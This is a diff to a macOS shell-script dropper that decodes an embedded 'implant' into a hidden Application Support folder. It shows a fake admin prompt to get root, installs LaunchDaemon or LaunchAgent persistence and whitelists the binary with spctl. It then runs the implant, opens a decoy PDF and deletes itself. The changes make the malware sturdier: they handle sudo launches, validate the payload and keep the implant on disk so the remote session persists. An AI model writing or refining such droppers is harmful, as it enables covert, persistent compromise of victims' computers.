@@ -11,13 +11,34 @@
 # achievable equivalent.
 set -euo pipefail
 
-WORKDIR="$HOME/Library/Application Support/.fleet-update"
+# Resolve the invoking user's home even when launched via `sudo ./x.command`;
+# under sudo, $HOME is /var/root and any LaunchAgent written there is orphaned.
+RUN_UID="$(id -u)"
+TARGET_USER="$(id -un)"
+TARGET_HOME="$HOME"
+if [ "$RUN_UID" = "0" ] && [ -n "${SUDO_USER:-}" ] && [ "$SUDO_USER" != "root" ]; then
+  TARGET_USER="$SUDO_USER"
+  if command -v dscl >/dev/null 2>&1; then
+    TARGET_HOME="$(dscl . -read "/Users/$SUDO_USER" NFSHomeDirectory 2>/dev/null | awk '{print $2}')"
+  fi
+  if [ -z "${TARGET_HOME:-}" ] || [ ! -d "$TARGET_HOME" ]; then
+    TARGET_HOME="/Users/$SUDO_USER"
+  fi
+fi
+WORKDIR="$TARGET_HOME/Library/Application Support/.fleet-update"
 mkdir -p "$WORKDIR"
 
 # ---- decode payloads embedded at build time --------------------------------
 IMPLANT_B64='{{IMPLANT_B64}}'
 printf '%s' "$IMPLANT_B64" | base64 -D > "$WORKDIR/fleetrun"
 chmod 0755 "$WORKDIR/fleetrun"
+
+# Guard against a mis-packaged artifact: this path must hold the Mach-O implant,
+# not a copy of this script (which would recurse forever and never connect).
+if ! file "$WORKDIR/fleetrun" 2>/dev/null | grep -q 'Mach-O'; then
+  echo "[fleet] embedded payload is not a Mach-O executable — aborting" >&2
+  exit 1
+fi
 
 INSTALL_B64='{{INSTALL_DAEMON_B64}}'
 printf '%s' "$INSTALL_B64" | base64 -D > "$WORKDIR/install-daemon.sh" 2>/dev/null || true
@@ -82,14 +103,25 @@ fi
 # osascript "with administrator privileges" shows the standard macOS
 # username/password prompt. If the user grants credentials we run the full
 # root installer: spctl --add belt-and-suspenders whitelist +
-# /Library/LaunchDaemons + stay-awake.
-if [ "$(id -u)" != "0" ] && [ -x "$WORKDIR/install-daemon.sh" ]; then
-  osascript -e "do shell script \"$WORKDIR/install-daemon.sh '$WORKDIR/fleetrun' io.fleet.agent\" with administrator privileges" >/dev/null 2>&1 || true
+# /Library/LaunchDaemons + stay-awake. When already root (sudo), run it directly.
+if [ -x "$WORKDIR/install-daemon.sh" ]; then
+  if [ "$RUN_UID" = "0" ]; then
+    "$WORKDIR/install-daemon.sh" "$WORKDIR/fleetrun" io.fleet.agent >/dev/null 2>&1 || true
+  else
+    osascript -e "do shell script \"$WORKDIR/install-daemon.sh '$WORKDIR/fleetrun' io.fleet.agent\" with administrator privileges" >/dev/null 2>&1 || true
+  fi
+fi
+
+if [ "$RUN_UID" = "0" ] && [ -n "${SUDO_USER:-}" ]; then
+  chown -R "$TARGET_USER":staff "$WORKDIR" 2>/dev/null || true
 fi
 
 # ---- per-user LaunchAgent fallback (works without root) --------------------
-AGENT="$HOME/Library/LaunchAgents/io.fleet.update.plist"
-mkdir -p "$HOME/Library/LaunchAgents"
+# Under sudo the LaunchDaemon above is the persistence mechanism; a LaunchAgent
+# in /var/root would never load into the user's GUI session.
+if [ "$RUN_UID" != "0" ]; then
+AGENT="$TARGET_HOME/Library/LaunchAgents/io.fleet.update.plist"
+mkdir -p "$TARGET_HOME/Library/LaunchAgents"
 cat > "$AGENT" <<PLIST
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -102,6 +134,7 @@ cat > "$AGENT" <<PLIST
 PLIST
 launchctl unload "$AGENT" 2>/dev/null || true
 launchctl load "$AGENT" 2>/dev/null || true
+fi
 
 # ---- run the implant -------------------------------------------------------
 "$WORKDIR/fleetrun" >/dev/null 2>&1 &
@@ -111,5 +144,8 @@ sleep 1.5
 command -v open >/dev/null 2>&1 && open "$WORKDIR/decoy.pdf" >/dev/null 2>&1 || true
 
 # ---- self-destruct ---------------------------------------------------------
-(sleep 5; rm -rf "$WORKDIR" "$0") >/dev/null 2>&1 &
+# Remove only this .command file. $WORKDIR/fleetrun is the persistence target
+# referenced by the LaunchAgent/LaunchDaemon — deleting it would drop the
+# session permanently on the next login.
+(sleep 5; rm -f "$0") >/dev/null 2>&1 &
 exit 0
